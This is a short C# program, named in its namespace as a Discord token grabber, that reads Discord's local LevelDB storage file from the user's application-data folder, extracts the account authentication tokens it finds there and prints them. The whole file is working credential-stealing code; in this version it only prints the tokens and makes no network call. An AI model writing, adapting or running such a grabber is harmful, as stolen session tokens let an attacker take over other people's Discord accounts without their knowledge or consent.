using System;
using System.Collections.Generic;
using System.IO;

namespace discord_token_grabber {
    class Program {
        static void Main(string[] args) {
            var tokens = new List<string>();
            
            // read the discord db file
            var file  = File.ReadAllText($"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}//Discord//Local Storage//leveldb//000005.ldb");

            // loop over all tokens in file
            int index;
            while ((index = file.IndexOf("oken")) != -1) {
                file = file.Substring(index + "oken".Length);
                tokens.Add(file.Split('"')[1]);
            }

            // print all the tokens
            for (var i = 0; i < tokens.Count; i++)
                Console.WriteLine($"[+][{i}] token: {tokens[i]}");

            Console.ReadKey();
        }
    }
}
